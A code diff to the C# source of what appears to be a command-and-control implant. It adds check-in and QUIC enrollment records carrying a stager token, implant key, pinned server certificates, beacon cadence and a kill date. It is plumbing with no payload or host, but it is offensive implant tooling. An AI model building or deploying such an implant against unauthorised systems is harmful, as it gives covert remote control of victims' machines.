@@ -1,3 +1,6 @@
+using System.Security.Cryptography;
+using System.Security.Cryptography.X509Certificates;
+
 namespace Rod.Implant.Internal;
 
 // The check-in module seam (architecture.md Sec 8): the program's coordinator
@@ -56,7 +59,10 @@ internal interface ICheckInClient
 /// by every client covering one run, and the live cadence the clients sleep
 /// on -- mutable at run time by the beacon.sleep verb, so every client
 /// covering the run retunes together. One record so the generated transport
-/// selection can hand each compiled-in client the same setup.
+/// selection can hand each compiled-in client the same setup. The optional
+/// enroll connection is the QUIC enroll exchange's live wire: the first
+/// session cycle rides it -- the ordinary handshake follows the enroll on
+/// the same stream -- and null on every other shape.
 /// </summary>
 internal sealed record CheckInSetup(
     Config Config,
@@ -66,7 +72,43 @@ internal sealed record CheckInSetup(
     TaskNonceTracker Nonces,
     HeldTaskLedger Held,
     TextWriter Log,
-    Cadence Cadence);
+    Cadence Cadence,
+    IAsyncDisposable? EnrollConnection = null);
+
+/// <summary>
+/// One enroll dial (architecture.md Sec 8 -- enrollment over QUIC): the
+/// inputs the program (or a handler deriving a child) hands the enroll
+/// client the baked transport selection names. An http(s) URL runs the JSON
+/// enroll cycle; a quic-schemed URL runs the frame exchange on the QUIC
+/// module's dial -- the same URL-shape dispatch the check-in clients follow.
+/// The transport profile's malleable knobs shape the http body only; over
+/// QUIC the exchange is frames under TLS 1.3, so the profile contributes
+/// just its request timeout, and ServerCAs is the pinned chain the dial
+/// validates against (the QUIC enroll requires one -- it has no system-root
+/// fallback).
+/// </summary>
+internal sealed record EnrollDial(
+    string EnrollUrl,
+    string StagerToken,
+    string? ParentImplantId,
+    ECDsa PrivateKey,
+    X509Certificate2Collection? ServerCAs,
+    TransportProfile Profile,
+    string? ImplantClass = null,
+    HostIdentity? Host = null,
+    string? KillDate = null,
+    TextWriter? Log = null)
+{
+    /// <summary>
+    /// Set by the QUIC enroll client on success: the live connection the
+    /// exchange rode, so the first session cycle's ordinary handshake can
+    /// follow on the same stream (architecture.md Sec 8 -- one connection
+    /// carries enroll-then-session). Null on every other shape and on every
+    /// refused exchange. Typed as the disposable interface because the
+    /// concrete wire belongs to the QUIC module, which may not compile.
+    /// </summary>
+    public IAsyncDisposable? OpenedConnection { get; set; }
+}
 
 /// <summary>
 /// The beacon URL shapes (architecture.md Sec 8): a schemed http(s) URL
